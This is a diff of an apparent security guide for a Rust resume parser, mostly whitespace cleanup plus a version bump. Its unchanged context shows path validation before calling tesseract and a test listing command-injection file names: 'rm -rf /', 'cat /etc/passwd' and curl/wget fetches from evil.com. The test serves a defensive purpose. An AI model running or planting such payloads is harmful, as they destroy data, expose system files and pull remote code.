@@ -373,22 +373,22 @@ Command::new("pdftoppm")
 for image_path in generated_images {
     let canonical_image = image_path.canonicalize()?;
     let canonical_temp = temp_dir.canonicalize()?;
-    
+
     // Must be within temp_dir
     if !canonical_image.starts_with(&canonical_temp) {
         continue; // Skip
     }
-    
+
     // Must be a regular file
     if !canonical_image.is_file() {
         continue;
     }
-    
+
     // Must be PNG
     if canonical_image.extension() != Some("png") {
         continue;
     }
-    
+
     // Now safe to process
     Command::new("tesseract")
         .arg(&canonical_image)  // Validated path
@@ -484,7 +484,7 @@ let output = Command::new("tesseract")
 
 // Check exit status
 if !output.status.success() {
-    return Err(anyhow!("Tesseract failed: {}", 
+    return Err(anyhow!("Tesseract failed: {}",
         String::from_utf8_lossy(&output.stderr)));
 }
 
@@ -532,9 +532,9 @@ mod tests {
     fn test_temp_dir_cleanup() {
         let parser = ResumeParser::new();
         let temp_count_before = count_temp_dirs();
-        
+
         let _ = parser.parse_pdf(Path::new("test.pdf"));
-        
+
         let temp_count_after = count_temp_dirs();
         assert_eq!(temp_count_before, temp_count_after);
     }
@@ -547,7 +547,7 @@ mod tests {
 #[test]
 fn test_command_injection_attempts() {
     let parser = ResumeParser::new();
-    
+
     let attack_paths = vec![
         "file.pdf; rm -rf /",
         "file.pdf && cat /etc/passwd",
@@ -555,7 +555,7 @@ fn test_command_injection_attempts() {
         "$(curl http://evil.com/shell.sh)",
         "`wget http://evil.com/malware`",
     ];
-    
+
     for path in attack_paths {
         let result = parser.parse_pdf(Path::new(path));
         assert!(result.is_err(), "Failed to reject: {}", path);
@@ -579,6 +579,6 @@ fn test_command_injection_attempts() {
 
 ---
 
-**Last Updated**: 2026-01-25
-**Version**: 2.6.3
+**Last Updated**: 2026-03-18
+**Version**: 2.6.4
 **Security Level**: Production Ready
